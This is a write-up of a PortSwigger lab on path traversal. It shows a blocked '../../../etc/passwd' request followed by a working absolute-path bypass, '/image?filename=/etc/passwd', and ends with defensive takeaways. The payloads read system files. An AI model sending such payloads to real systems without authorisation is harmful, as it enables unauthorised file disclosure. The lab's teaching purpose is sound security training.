# Lab 02 — File path traversal, traversal sequences blocked with absolute path bypass

**Difficulty:** 🟡 Practitioner  
**Technique:** Path Traversal — absolute path bypass  
**Link:** https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

---

## Concept

This lab blocks `../` traversal sequences but fails to validate absolute paths. By supplying a full absolute path instead of a relative one, the filter is bypassed entirely and the OS resolves the path directly.

---

## Reconnaissance

Same injection point as Lab 01:

```
GET /image?filename=18.jpg
```

Attempting `../../../etc/passwd` returns an error — the app strips or blocks traversal sequences.

---

## Process

### Step 1 — Confirm traversal sequences are blocked

```
GET /image?filename=../../../etc/passwd
```

**Result:** error or empty response — filter is active.

### Step 2 — Try an absolute path instead

```
GET /image?filename=/etc/passwd
```

**Result:** full `/etc/passwd` contents returned with 200 OK.

---

## Why it works

The filter looks for `../` sequences but doesn't check whether the path starts with `/`. The OS interprets `/etc/passwd` as an absolute path, ignoring any base directory the application tries to enforce.

---

## Issues encountered

None once the absolute path approach was identified.

---

## Takeaways

- Blocking `../` is not enough if absolute paths aren't also restricted
- `/etc/passwd` as an absolute path bypasses relative traversal filters
- The correct defense is a strict whitelist of allowed filenames, not a blacklist of sequences
- Defense in depth: validate input AND use `realpath()` / `basename()` server-side to resolve and confine paths

---

## References

- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
